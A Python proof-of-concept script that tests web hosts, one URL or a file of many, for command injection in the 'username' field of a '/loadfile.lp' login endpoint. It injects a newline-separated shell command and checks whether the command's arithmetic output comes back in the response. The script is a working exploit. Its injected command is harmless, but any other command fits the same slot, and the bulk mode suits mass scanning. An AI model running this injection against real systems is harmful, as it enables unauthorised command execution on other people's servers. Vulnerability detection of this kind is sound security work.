import argparse
import random
import requests

def test_url(url):
    # Generate a random number between 10000 and 100000
    num = random.randint(10000, 100000)

    # Construct the payload for the POST request
    payload = f'POC%0Aecho -e "\\n";echo $(({num} * 2));echo -e "\\n"%0A'
    data = f'username={payload}&userpassword=sample_password&login=Login'
    loadfile_url = f"{url}/loadfile.lp?pageid=Home"

    try:
        # Make the HTTP POST request
        print(f"[*] Sending POST request to {loadfile_url}")
        resp = requests.post(loadfile_url, headers={'Content-Type': 'application/x-www-form-urlencoded'}, data=data)
        resp.raise_for_status()

        # Check if the response contains the expected output
        for line in resp.text.splitlines():
            if str(num*2) in line:
                print("[+] Command Injection Vulnerability Detected!")
                print(f"[*] Payload: {payload}")
                return
        print("[-] Command Injection Vulnerability Not Detected.")
    except requests.exceptions.RequestException as e:
        # Handle any exceptions that occur during the request
        print("[-] Request failed:", e)

def test_urls_from_file(filename):
    # Read URLs from the specified file and test each URL
    with open(filename, 'r') as file:
        for url in file:
            url = url.strip()
            print(f"[*] Testing URL: {url}")
            test_url(url)

def main():
    # Parse command-line arguments
    parser = argparse.ArgumentParser(description="Test for command injection vulnerability via HTTP POST request")
    parser.add_argument("-url", help="Target URL")
    parser.add_argument("-file", help="Input file containing URLs")
    args = parser.parse_args()

    # Check if a single URL is provided
    if args.url:
        print(f"[*] Testing single URL: {args.url}")
        test_url(args.url)
    # Check if an input file containing URLs is provided
    elif args.file:
        print(f"[*] Testing URLs from file: {args.file}")
        test_urls_from_file(args.file)
    else:
        # Print an error message if no target URL or input file is provided
        print("[-] Please provide either a target URL or an input file")

if __name__ == "__main__":
    # Run the main function when the script is executed
    main()
